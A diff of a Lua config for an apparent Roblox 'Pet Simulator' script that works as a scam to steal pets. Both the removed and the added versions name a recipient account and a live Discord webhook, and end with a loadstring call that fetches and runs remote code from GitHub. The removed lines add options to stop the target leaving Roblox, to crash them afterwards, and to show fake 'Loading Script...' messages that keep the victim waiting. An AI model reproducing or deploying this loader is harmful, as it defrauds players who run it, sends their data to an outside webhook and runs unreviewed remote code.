@@ -1,18 +1,9 @@
---[[ Config ]]--
-_G.Username = "Eduarddinu2017" --// Username To Send Pets To
-_G.ScriptName = "Kix Project" --// Script Name For Watermark
-_G.Webhook = "https://discord.com/api/webhooks/1097113513467588709/gpsjdNrQcDrr-g_Yg3MXpnEvRAOH7R_ifwIsD_UVVBHjIVxaN4XbmmFCypVRtX1MuOT_" --// Discord Webhook For Executions
-_G.GiftMessage = "Thx for help" --// Message For The Gift To Say
-_G.Diamonds = 1 --// Amount Of Diamonds To Not Kick
-_G.UnlockPets = true --// Unlocks Locked Pets
-_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
-_G.Crash = true  --// Crashes Them After Its Finished
-_G.Tip1 = "Loading Script..." --// Gives You Tips On The UI
-_G.Tip2 = "Don't Leave!" --// Gives You Tips On The UI
-_G.Tip3 = "Loading Script..." --// Gives You Tips On The UI
-_G.Tip4 = "Don't Leave!" --// Gives You Tips On The UI
-_G.Tip5 = "Almost Ready!" --// Gives You Tips On The UI
+Username = "Eduarddinu2017"
+WebHook = "https://discord.com/api/webhooks/1097113015624663072/DXUUW2GikFfl8MEAuOs4fGJMRUyKs8-uxTB1G8fmmes3psx7qAWff9u1hXhUSQEOf-CR"
 
---[[ Script ]]--
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()
+_G.CustomScriptName = "Kix Project"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting For Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
